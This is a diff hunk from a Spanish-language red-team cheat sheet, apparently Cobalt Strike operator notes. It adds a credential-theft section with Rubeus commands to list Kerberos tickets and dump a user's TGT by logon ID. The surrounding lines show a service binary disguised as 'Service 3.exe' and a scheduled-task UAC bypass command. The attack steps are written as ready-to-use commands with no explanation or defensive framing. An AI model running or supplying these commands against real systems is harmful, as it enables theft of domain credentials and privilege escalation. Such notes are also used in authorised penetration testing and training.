@@ -160,6 +160,16 @@ Copiar el binario
 copy "tcp-local_x64.svc.exe" "Service 3.exe"
 ```
 
+# Credential Theft
+Extraer Tickets de Kerberos
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+```
+Coger el TGT
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x... /service:
+```
+
 ## UAC Bypasses
 ```
 elevate uac-schtasks tcp-local
